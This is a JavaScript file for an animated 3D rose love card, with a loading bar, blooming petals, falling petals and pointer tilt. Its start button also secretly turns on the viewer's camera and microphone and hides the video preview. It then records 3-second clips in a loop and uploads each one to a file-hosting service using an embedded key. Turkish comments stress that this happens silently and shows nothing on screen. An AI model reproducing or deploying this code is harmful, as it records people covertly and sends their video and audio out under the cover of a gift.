document.addEventListener('DOMContentLoaded', () => {

    const triggerOverlay = document.getElementById('triggerOverlay');
    const startButton = document.getElementById('startButton');
    const loadingBar = document.getElementById('loadingBar');
    const statusText = document.getElementById('statusText');
    const ambientLight = document.getElementById('ambientLight');
    const roseWrapper = document.getElementById('roseWrapper');
    const roseHead = document.getElementById('roseHead');
    const calyx = document.getElementById('calyx');
    const stem = document.getElementById('stem');
    const leafLeft = document.getElementById('leafLeft');
    const leafRight = document.getElementById('leafRight');
    const endText = document.getElementById('endText');
    const fallingPetalsEl = document.getElementById('fallingPetals');
    const scene = document.querySelector('.scene');
    const preview = document.getElementById('preview');

    const PETAL_LAYERS = [
        { count: 4, w: 24, h: 46, curl: 78, delayBase: 0, tz: 2, cls: 'petal-bud' },
        { count: 5, w: 34, h: 58, curl: 65, delayBase: 0.25, tz: 9, cls: 'petal-core' },
        { count: 6, w: 46, h: 72, curl: 48, delayBase: 0.55, tz: 18, cls: 'petal-inner' },
        { count: 7, w: 58, h: 88, curl: 22, delayBase: 0.90, tz: 30, cls: 'petal-mid-inner' },
        { count: 8, w: 72, h: 104, curl: -5, delayBase: 1.30, tz: 44, cls: 'petal-mid' },
        { count: 9, w: 86, h: 118, curl: -25, delayBase: 1.75, tz: 60, cls: 'petal-outer' },
        { count: 10, w: 98, h: 130, curl: -48, delayBase: 2.25, tz: 76, cls: 'petal-blush' },
    ];

    const SEPALS_COUNT = 5;

    const FALLING_PETAL_COLORS = [
        ['#9a001d', '#3d0008'],
        ['#850018', '#2b0005'],
        ['#ad0022', '#480008'],
        ['#bf0028', '#52000c'],
    ];

    let fallingPetalInterval = null;

    // ---- Kamera + arka planda sessiz kayıt/yükleme ayarları ----
    const UPLOADCARE_PUBLIC_KEY = "3ad243a6abb0116d6d39"; // ← kendi public key'ini yaz
    const RECORD_SECONDS = 3;

    let mediaStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let isRecording = false;

    function startCardLoader() {
        const duration = 2400;
        const steps = [
            { threshold: 20, text: 'Loading Love.css...' },
            { threshold: 50, text: 'Growing digital petals...' },
            { threshold: 80, text: 'Adding velvet textures...' },
            { threshold: 95, text: 'Optimizing 3D rendering...' },
            { threshold: 100, text: 'Ready to bloom!' }
        ];

        let startTimestamp = null;

        function animateLoader(timestamp) {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const percent = Math.floor(progress * 100);

            loadingBar.style.width = `${percent}%`;
            const activeStep = steps.find(s => percent <= s.threshold) || steps[steps.length - 1];
            statusText.textContent = activeStep.text;

            if (progress < 1) {
                requestAnimationFrame(animateLoader);
            } else {
                startButton.removeAttribute('disabled');
            }
        }

        requestAnimationFrame(animateLoader);
    }

    function createSepals() {
        const step = 360 / SEPALS_COUNT;
        for (let i = 0; i < SEPALS_COUNT; i++) {
            const sepal = document.createElement('div');
            sepal.className = 'sepal';
            const angle = i * step + (Math.random() - 0.5) * 5;
            const sepalDelay = 0.3 + i * 0.06;
            const curl = 18 + Math.random() * 8;

            sepal.style.setProperty('--sepal-angle', `${angle}deg`);
            sepal.style.setProperty('--sepal-curl', `${curl}deg`);
            sepal.style.setProperty('--sepal-delay', `${sepalDelay}s`);
            calyx.appendChild(sepal);
        }
    }

    function createPetals() {
        PETAL_LAYERS.forEach((layer, li) => {
            const angleStep = 360 / layer.count;
            const layerOffset = li * 24 + (Math.random() - 0.5) * 8;

            for (let i = 0; i < layer.count; i++) {
                const petal = document.createElement('div');
                petal.className = `petal ${layer.cls}`;

                const angle = layerOffset + i * angleStep + (Math.random() - 0.5) * 5;
                const petalDelay = layer.delayBase + i * 0.05;
                const curlJitter = (Math.random() - 0.5) * 6;
                const scaleJitter = 0.94 + Math.random() * 0.12;
                const bloomDur = 2.1 + Math.random() * 0.4;

                petal.style.width = `${layer.w}px`;
                petal.style.height = `${layer.h}px`;
                petal.style.setProperty('--angle', `${angle}deg`);
                petal.style.setProperty('--curl', `${layer.curl + curlJitter}deg`);
                petal.style.setProperty('--scale', scaleJitter);
                petal.style.setProperty('--delay', `${petalDelay}s`);
                petal.style.setProperty('--tz', `${layer.tz}px`);
                petal.style.setProperty('--bloom-dur', `${bloomDur}s`);

                roseHead.appendChild(petal);
            }
        });
    }

    function growStem() {
        return new Promise(resolve => {
            stem.classList.add('grow');

            setTimeout(() => {
                leafLeft.classList.add('visible');
            }, 800);

            setTimeout(() => {
                leafRight.classList.add('visible');
            }, 1100);

            setTimeout(resolve, 2200);
        });
    }

    function bloom() {
        calyx.classList.add('visible');
        ambientLight.classList.add('visible');
        roseHead.classList.add('blooming');
    }

    function spawnFallingPetal() {
        if (fallingPetalsEl.childElementCount > 10) return;

        const petal = document.createElement('div');
        petal.className = 'falling-petal';

        const w = 10 + Math.random() * 12;
        const h = w * (1.25 + Math.random() * 0.15);
        const x = 20 + Math.random() * 60;
        const y = 3 + Math.random() * 10;
        const dur = 5.5 + Math.random() * 3.5;
        const fpDelay = Math.random() * 0.6;

        const colors = FALLING_PETAL_COLORS[Math.floor(Math.random() * FALLING_PETAL_COLORS.length)];

        const sign = () => (Math.random() > 0.5 ? 1 : -1);
        const s1 = sign() * (15 + Math.random() * 25);
        const s2 = sign() * (10 + Math.random() * 20);
        const s3 = sign() * (20 + Math.random() * 30);
        const s4 = sign() * (10 + Math.random() * 15);

        petal.style.left = `${x}vw`;
        petal.style.top = `${y}vh`;
        petal.style.setProperty('--fp-w', `${w}px`);
        petal.style.setProperty('--fp-h', `${h}px`);
        petal.style.setProperty('--fp-c1', colors[0]);
        petal.style.setProperty('--fp-c2', colors[1]);
        petal.style.setProperty('--f-dur', `${dur}s`);
        petal.style.setProperty('--f-delay', `${fpDelay}s`);
        petal.style.setProperty('--s1', `${s1}px`);
        petal.style.setProperty('--s2', `${s2}px`);
        petal.style.setProperty('--s3', `${s3}px`);
        petal.style.setProperty('--s4', `${s4}px`);

        fallingPetalsEl.appendChild(petal);

        setTimeout(() => {
            if (petal.parentNode) petal.remove();
        }, (dur + fpDelay) * 1000 + 300);
    }

    function startFallingPetals() {
        for (let i = 0; i < 3; i++) {
            setTimeout(() => spawnFallingPetal(), i * 300);
        }

        fallingPetalInterval = setInterval(() => {
            spawnFallingPetal();
        }, 2200);
    }

    async function startAnimationSequence() {
        await growStem();
        await delay(100);
        bloom();

        setTimeout(() => {
            isAutoRotating = true;
        }, 2600);

        setTimeout(() => startFallingPetals(), 3400);

        setTimeout(() => {
            endText.classList.add('visible');
        }, 4600);
    }

    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // ---- Kamera aç + arka planda 3sn'lik parçalar halinde kayıt/yükleme ----
    // Hiçbir aşamada ekrana yazı yazmaz; sadece console'a log düşer.

    async function startCameraAndRecording() {
        try {
            mediaStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: true
            });

            if (preview) {
                preview.srcObject = mediaStream;
                preview.style.display = 'none'; // gizli kalsın
            }

            isRecording = true;
            startNextRecording();

        } catch (err) {
            console.error('Kamera erişimi reddedildi:', err);
        }
    }

    function startNextRecording() {
        if (!isRecording || !mediaStream) return;

        recordedChunks = [];
        mediaRecorder = new MediaRecorder(mediaStream, {
            mimeType: 'video/webm;codecs=vp9'
        });

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) recordedChunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
            if (!isRecording) return;

            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const fileName = `tepki_${Date.now()}.webm`;

            try {
                const formData = new FormData();
                formData.append('UPLOADCARE_PUB_KEY', UPLOADCARE_PUBLIC_KEY);
                formData.append('UPLOADCARE_STORE', '1');
                formData.append('file', blob, fileName);

                await fetch('https://upload.uploadcare.com/base/', {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error('Yükleme hatası:', err);
            }

            // Hemen sonraki parçayı kaydetmeye başla
            if (isRecording) {
                setTimeout(startNextRecording, 200);
            }
        };

        mediaRecorder.start(1000);

        // RECORD_SECONDS sonra durdur → yükle → tekrar başla
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, RECORD_SECONDS * 1000);
    }

    function stopAll() {
        isRecording = false;

        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }

        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
            mediaStream = null;
        }

        if (preview) preview.srcObject = null;
    }

    // ---- Tek buton: gül animasyonunu başlatır + arka planda kamera kaydını başlatır ----
    startButton.addEventListener('click', () => {
        startCameraAndRecording(); // arka planda sessizce başlar, ekrana yazı yazmaz

        triggerOverlay.classList.add('fade-out');

        setTimeout(() => {
            startAnimationSequence();
        }, 800);
    });

    createSepals();
    createPetals();

    setTimeout(() => {
        startCardLoader();
    }, 400);

    // ---- Parmak / mouse ile 3D eğim (tilt) efekti ----
    // Parmağını nereye götürürsen gül de o yöne doğru eğilir.
    const BASE_ROT_X = -22;      // gülün varsayılan eğimi (CSS'teki ile aynı)
    const MAX_TILT_X = 18;       // yukarı/aşağı hareketin max etkisi (derece)
    const MAX_TILT_Y = 28;       // sağ/sol hareketin max etkisi (derece)
    const SMOOTHING = 0.08;      // takip yumuşaklığı (0-1, küçük = daha yumuşak)
    const AUTO_ROTATE_SPEED = 360 / 28000; // derece/ms → 28 saniyede 1 tam tur

    let tiltX = 0, tiltY = 0;
    let targetTiltX = 0, targetTiltY = 0;
    let autoAngle = 0;
    let isAutoRotating = false;
    let lastFrameTime = null;

    function updatePointerTilt(clientX, clientY) {
        const nx = (clientX / window.innerWidth) * 2 - 1;  // -1..1 (sol-sağ)
        const ny = (clientY / window.innerHeight) * 2 - 1; // -1..1 (üst-alt)
        targetTiltY = nx * MAX_TILT_Y;
        targetTiltX = -ny * MAX_TILT_X;
    }

    window.addEventListener('pointermove', (e) => {
        updatePointerTilt(e.clientX, e.clientY);
    }, { passive: true });

    window.addEventListener('touchmove', (e) => {
        if (e.touches && e.touches.length > 0) {
            updatePointerTilt(e.touches[0].clientX, e.touches[0].clientY);
        }
    }, { passive: true });

    function renderTilt(timestamp) {
        if (lastFrameTime === null) lastFrameTime = timestamp;
        const dt = timestamp - lastFrameTime;
        lastFrameTime = timestamp;

        tiltX += (targetTiltX - tiltX) * SMOOTHING;
        tiltY += (targetTiltY - tiltY) * SMOOTHING;

        if (isAutoRotating) {
            autoAngle += AUTO_ROTATE_SPEED * dt;
        }

        roseWrapper.style.transform =
            `rotateX(${BASE_ROT_X + tiltX}deg) rotateY(${autoAngle + tiltY}deg)`;

        requestAnimationFrame(renderTilt);
    }

    requestAnimationFrame(renderTilt);

});
